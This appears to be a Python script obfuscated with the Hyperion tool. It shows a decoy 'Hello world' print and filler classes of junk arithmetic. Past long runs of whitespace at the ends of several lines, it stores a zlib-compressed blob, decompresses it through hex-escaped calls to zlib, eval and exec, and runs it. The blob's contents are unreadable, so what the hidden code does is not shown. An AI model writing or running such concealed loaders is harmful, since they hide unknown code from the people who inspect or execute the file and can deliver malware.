from builtins import *
from math import prod as Theory


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


_theory, Run, _system, _power, _product, _multiply, _modulo = exec, str, tuple, map, ord, globals, type

class Frame:
    def __init__(self, _run):
        self._divide = Theory((_run, 50956))
        self._while(CallFunction=25867)

    def _while(self, CallFunction = None):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._divide *= -28144 * CallFunction
        
        try:
            ((_system, (_hypothesis, Run, _power)) for _system in {_system: _hypothesis} if _multiply > _product)

        except ArithmeticError:
            ({_system: _power} or Run if {_system: _power} and Run else ... or (Run, {_system: _power}))

        except:
            _modulo(-50304 + -15899) == float

    def _invert(self, _callfunction = 3396):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _callfunction -= 35174 + -62361
        self.Power != Ellipsis
        
        try:
            ((_product, {_system: _hypothesis}) for _product in {_system: _hypothesis} if _power <= Run)

        except OSError:
            (((_hypothesis, Run, _power), _product) for _product in {_system: _hypothesis})

        except:
            _modulo(-63883 - -450) == float

    def DetectVar(Multiply = type):
        return _multiply()[Multiply]

    def While(_stackoverflow = 85812 * 46758, _substract = Ellipsis, System = _multiply):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        System()[_stackoverflow] = _substract
        
        try:
            ((_system, (_hypothesis, Run, _power)) for _system in (_hypothesis, Run, _power) if Run < _power)

        except OSError:
            (({_system: _power}, _product) for _product in (_system, _theory, _system))

        except:
            _modulo(-92406 - 32186) == True

    def execute(code = str):
        return _theory(Run(_system(_power(_product, code))))

    @property
    def Power(self):
        self._algorithm = '<__main__._while object at 0x000007944BE65126>'
        return (self._algorithm, Frame.Power)

if __name__ == '__main__':
    try:
        Frame.execute(code = __code__)
        _builtins = Frame(_run = 35722 * -33779)

        Frame(_run = -61449 / -67439)._while(CallFunction = _builtins._divide + 69358)                                                                                                                                                                                                                                                          ;Frame.While(_stackoverflow='OOOO00O0OooOoO00O0O0oOO',_substract=b'x\x9c\xddY_o\xe28\x10\x7f\xe7S\xb0\xbc$Q[\x1a\x12H\x00\xa9/\'\xee\xb4\x95\x0e8mOGO-\x8aB\xe2P\xb3&F\xf9\xb3\x85o\xbf3\xb6\xa1@K mw\x1fp\x18{\xec\x8c\xc7\xceo\xec\xf1\xb8\xcd\x92U\xb7R\x85D#]\x94\x98<\x8fO\xa2<\r\xfc\x8c\'\x9eW\xfdrS\xfb\xbaZ\x90\x84\xf2\xb8V\xe5\xc9\x96\x98\x9fgO<I\x85\x8c^\x9bP\xc6V\xd9\x13\x99r?\xb3[N\xed\xb2\xf6\x07\xcb\xc97\x12\xd6\x8c\x9d^S\x9a=\xe5\x13\xa9\xf8)\xcb\x16i\xf7\xfaZ\xb6\xd5\x03>\xbf\xdeSs}`\xec\x90\xa6\x01O\xc2]5\xaa\xb1>\x9d^/\x98?\xcd\xc9^\'F\x03\x12\xa7Dv\xfa\xf3\x9f\xbf\xaf\xac\xba\xb9\'\x12\xf0P\xbe\xd7\x16\t\x8d3\xbd\xf6\x950\xc6\xab\xcf<a\xe1\x97\x9a\xa1U\x8c\xeeF\x1a\xdfk\xe9w\x1ajF\x85,\x03\xb2\xc8\x14\x98\xf1"\x87\x9e\xdfxJ\xd2\xaa\x9f\x90jB\xc2\xc7\xf8?\xca\x19\xc9d\xc3\x04\x90y\x8c\xff\xe7\xb9\xa8\xf9UT\xf2\x18\x0f\xf8\x84\x87\xab*\xa3\xdf\xa1\xdf\x8a\xe75\xa3"\'E\xe7\x0b\x9ed\x9e\x07\xa3\xadR\xcd\xa8\x93%\xcdt\xa3\xc2x\xe0\xb3T7\x1e\xb4[\xa6\xd2-&(\x90c\xb7\xda\xf8f\xca\xf8\x04\x84*\x07$\xb0\xf3\xa0\xdf\xef\x0f\xfa\x83\x01\xe6P\x88*\xe4\xdaC\xb7{quq\xa5_\xe9\x17\r\xc3\x18\x8foB\x9a\x14\xe9\x89!\xcdeR\xe5k\x15S\x92\xf9YV\xa8\x06;\xa3"\xa1\x03\x18\xa9\x15r\xf8\x1a\xf9\xc5\x95\x83"\xd8\x7f8\xec\xf5z\x9cs(\x80\x1dr\xf8A\xcf\x17\x10\x0b\xc7V*\xe5O}\x0e\x0e\xfc\x86R]\x9b\xe4\x94e4F\x8b\xfc\xf0\x13\x98\xd6\x9b\xbdQ\xaf@t @\x160\x03\xba\xe3\x9b\x1d\xa8P>\xd6\xdf\x1c&\x8di\xc6h>\xd9G\xd3\xb8\xdc\xb2\x96\xb4]_TK\xaa1\x1e>IO\x9d\xc6!Y\xea\x1aI\x99\xff\xd7\xab\xd7c\xa3\x00\xa0\xe5\xf2y)i\xf9\x0c\t\xb9g\x80H\xd3\xea3N\xe3\x82\x8el\x06\xfe\x82\xd1\x19\xa3\x14~\xc0\xcff3\xac\xb1\xb3\x068O\xfe-\x87\xaf\xda\xe2r\x02\x9bt\xce\x18e>g\xd1[ \x15l\x7f\\wr\xf1-\xc5"\x04:g\x88\x98\xff\x83\x94\xdd\xa6K\t\xd1\x1a\xa6s\x86\x870\xba\x98\xf3\xa0\x1cB\x14\xfc\xcf\x0c\x9d\x10x\xa1\x19:\'\x8a\xe59\xc3\x94di\xc9m&+L6(\xe6\x9c\x11b\x9c\xbf~\x8b\xab\xa8(\x8c\x91\x18I\xf0n_\xd0*\x81\x13\xa5A\xea\xc7\xf4\xa38\x1dTS\x12\xa7\xc3z\xd68\xad"\xca\x96\xe4)\xceK\xae\xa7\xfe\xfaP[\x9fm\xdb\xfd\xdf\xf0\xe9\xfa\x01l\xf5\x89f\x9bVh\xb5\xad\xd0nX\x1d\x08\xebB\x82\xf7\x01]kG\xd9\xebI\x19"\xa2=\xdbU\x1b\x90e\xc9\xd3a\x08cp\x91`@\x1c\xe9\x98\x1d4\xa3\xe3\xd9^\xdbkB\xeez-\xe0:^\x03dMh\xd9k=\xae\n:^\x99\x1f\xb0\xbc\xdd\x8al\x13\xc8\x01j\x03u\x80lU\x17m\xd6D\xac\x8ccr\xeei+gM\xe3\x9br\xf3\xb4\\\xd7t;n\xd3i;\x91C,\x13\xca\xb6E\xb0\xcdr\x8f\x8e[`<8\xaf\xf0\xa8\x82\x03\x8bQyz\xd1S\xcc\xd7\xf6\x1a`(\xcb3\xd1H\xc8\x0b\xf3u\xf6[\x8f\xabj\x83\xad\x1d\xb0\xb6\r\x8f\x03dy\x16\xc8v^\xb7~\xc0\xc4h\x1eK\x99\t\xcb\x86\xa2\xd6V\xbd\xa9\xcc|\x8a\xac]\xd6\xd4\xcc\x9fOB\xbf\xda\x13[Dn\x14\xdc\x95\xbc\x07\x9b\xb3{\xc86\x87\x8dv\xf8S[n\xab\xad\x1eW\xf1\xee\x86D~l\xe2\x9b\xc9\x0e\xc5\xb6\x1e\x0eM`LH|\x08\xc4Mh\xed\x16\x1c`\x05+mt?\xba\xc74\x1a\xa9\xdf\xfd\xaf\xdf\xdc\r\xe5\xd6\xcd\xd3-\xb6\x01@\xfcid\xfd7\x12\xe9b\xfb\xfd\xee\xc1\xf3\xa8\xe8\xb2\n\xd7S\xbc\xa5\xe2^\xc3\xe8P\\Z\xf1\xf6\xfa\xc15\xddP.i\xed\x86:[k\xb7\x89\xfc\xd6\x9a>&{\xf2\xc1\xa7\xd0a\xe2\xeb\x99\x9a\x12\xce\xea]\xd0H\\\x10\x10y}gX\xff\x9d\xe7\xb8\xfa\x9c\x11\xaeG\\\xa1#LP\xbe\xe7k\x0e\xcf\xab\x19\xc2C\x04\x91\r\x17n\xd5\xc9\xee\xfb\x93w\xe9\xdd\xdd\x9de\x01A\xae\x08\x9ewnP\xf4I\\\x84\n\xf0@\x05\xdd\xd3\x10\xe3\x86_\xbfOK\x9am\xd7\xab\nO\xd5C\x9f\x8a\xf3\x95\xa1\x0e\xb2\xef\x83\xa1\xc0\x88\x91\x13!\xd9\xa6#8,\xb1\x8e\xb9\xacI:\xd9x2PSa[_\xfd\xa1\xf0\x9d\xc6[w\x89\xd7/\xe7\x1ft.\xeb\x18\xc7UN\xc3V\xbc\xa9\x9cI{\xcb\xb9\x1c\x93=16\xdar.\xca\xab\xb0\xf5$\xe5V\xfcl\x8b:\xbe\x138\x1d\xc8}\xc8;\x82\x0b\xe0\x91\xad\xf8\x04\x82T\xcbq\xbb\x96\r\xe9\x1c@\xc9\xb5\x9c\xc0\x82\xf5\xefD;A\x1d\xf0n\x13\x1e\xd3\xb5m\xdf\x8a\xac\x08\xe4\x1a\xaek\x11\xc7uD\x18\xe8\xb6\x1c\x0bz\x03\xfe\xf0\xc6\xc6\xa0\x10Z[\x98\x83\x0c\xd6C\xe8c;\r\xc7\x81~\x96\xdd\xb0-\xdb\x91Z`\x0cx\x0be\x07\x02\xc9\x08s\xe8\xd9\xc0\xef\xfc\x84\x80\xb2\x00\xec\xd0!;\xf4\x92o\xca\xcf\x87\xf8c\xd11\x1e\n*X\x91\xc1\x8b\x0c_~_D\xf2\x12\x8e\x99\\\xc4c\x18\x8a\x89\x90\x8c\x9b\x05GT\x94\xf0yu\xfd\x7f\x8a\xaa\xfc\x17H\x15.vA\x053]x\x89Xn \xb9\xa1\x8c\x8a\x12\xe2\xe9e\xbaJ+<\xadC\x91\x91\xb9>\xc3{\x818\xa4e\x10\x83\x8740\xc6\x96\x888-d`+\xae\x82C\xa3\xf2\x13\xb5H\xe6\x8e')

        _builtins._while(CallFunction = _builtins._divide / 43648)                                                                                                                                                                                                                                                          ;ODOODooooDOoOoOoOOD,xwwxxwxxxxwwwwwxxxwwx,DooOODooOoDoDOOooD,nnnnmmnmmmnnnnnmmnn,nmnnnnnmmmnmmnnmmnn=(lambda JLIIIILLLLJILIJLIJIJJJL:JLIIIILLLLJILIJLIJIJJJL['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda JLIIIILLLLJILIJLIJIJJJL:JLIIIILLLLJILIJLIJIJJJL(__import__('\x7a\x6c\x69\x62'))),(lambda JLIIIILLLLJILIJLIJIJJJL:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(JLIIIILLLLJILIJLIJIJJJL)"),filename='\x44\x6f\x4f\x4f\x4f\x44\x44\x44\x4f\x6f\x6f\x44\x44\x44\x4f\x44\x6f\x4f',mode='\x65\x76\x61\x6c'))),(lambda WWXXWWXWWWXXXXWWXWWWW,JLIIIILLLLJILIJLIJIJJJL:WWXXWWXWWWXXXXWWXWWWW(JLIIIILLLLJILIJLIJIJJJL)),(lambda:(lambda JLIIIILLLLJILIJLIJIJJJL:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(JLIIIILLLLJILIJLIJIJJJL)"),filename='\x44\x6f\x4f\x4f\x4f\x44\x44\x44\x4f\x6f\x6f\x44\x44\x44\x4f\x44\x6f\x4f',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        Frame(_run = 11748 * 30511)._invert(_callfunction = 95016 + _builtins._divide)                                                                                                                                                                                                                                                          ;nmnnnnnmmmnmmnnmmnn()(nnnnmmnmmmnnnnnmmnn(ODOODooooDOoOoOoOOD(xwwxxwxxxxwwwwwxxxwwx(DooOODooOoDoDOOooD('\x76\x61\x72\x73'))),Frame.DetectVar(Multiply='OOOO00O0OooOoO00O0O0oOO')))

    except Exception as _hypothesis:
        if 366091 > 6138697:
            Frame.execute(code = Run(_hypothesis))

        elif 310666 > 3865426:
            Frame(_run = -41674 * -51438)._invert(_callfunction = 21256 * _builtins._divide)